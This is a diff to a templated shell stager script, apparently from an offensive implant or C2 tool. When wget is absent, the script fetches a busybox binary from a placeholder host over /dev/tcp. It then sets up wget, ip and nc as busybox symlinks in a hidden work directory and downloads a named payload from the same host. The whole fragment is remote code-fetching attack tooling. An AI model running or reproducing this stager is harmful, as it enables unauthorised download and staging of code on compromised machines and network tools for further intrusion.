@@ -7,10 +7,15 @@ mkdir -p "$workdir"/bin
 
 if ! [ $(command -v wget) ]; then
   bash -c "exec 3<>/dev/tcp/{{.Host}}/{{.Port}}; echo BSH bb>&3; cat <&3" > "$workdir"/bin/busybox
-  chmod +x "$workdir"/bin/busybox
-  ln -s "$workdir"/bin/busybox "$workdir"/bin/wget
-  export PATH="$PATH:{{.WP}}dev/.sprrw/bin"
+else
+  wget -O "$workdir"/bin/busybox {{.Protocol}}://{{.Host}}:{{.Port}}/bb
 fi
+
+chmod +x "$workdir"/bin/busybox
+for i in wget ip nc; do
+  ln -s "$workdir"/bin/busybox "$workdir"/bin/"$i"
+done
+export PATH="$PATH:$workdir/bin"
 
 wget -O "$workdir"/{{.Name}} {{.Protocol}}://{{.Host}}:{{.Port}}/{{.Name}}
 
